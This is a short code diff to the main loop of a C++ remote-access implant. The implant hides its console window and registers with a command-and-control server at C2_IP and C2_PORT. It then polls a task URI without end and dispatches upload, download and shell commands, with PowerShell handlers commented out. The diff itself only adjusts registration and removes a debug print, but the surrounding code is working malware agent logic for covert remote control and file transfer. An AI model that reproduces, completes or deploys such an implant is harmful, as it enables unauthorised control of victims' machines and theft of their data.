@@ -20,14 +20,16 @@ int main()
 {
 	// Hide console window
 	//ShowWindow(GetConsoleWindow(), SW_HIDE);
-	Agent agent(C2_IP, C2_PORT);
+	Agent agent;
 	Command cmdHandler;
 
+	agent.Register(C2_IP, C2_PORT);
 
 	cmdHandler.RegisterCommand(UPLOAD_CMD, std::bind(&Agent::upload, agent));
 	cmdHandler.RegisterCommand(DOWNLOAD_CMD, std::bind(&Agent::download, agent));
 	cmdHandler.RegisterCommand(SHELL_CMD, std::bind(&Agent::shell, agent));
-
+	//cmdHandler.RegisterCommand(POWERSHELL_CMD, std::bind(&Agent::powershell, agent));
+	//cmdHandler.RegisterCommand(PSIMPORT_CMD, std::bind(&Agent::ps-import, agent));
 
 	while (true) {
 		std::string task = agent.Get(TASK_URI);
@@ -37,8 +39,6 @@ int main()
 			std::vector <std::string> args;
 			args = std::vector<std::string>(Task.begin() + 1, Task.end()); // @todo check if Task has more than 1
 			std::string Cmd = Task[0];
-
-			std::cout << Cmd;
 
 			if (cmdHandler.HasCommand(Cmd)) {
 				cmdHandler.ExecuteCommand(Cmd);
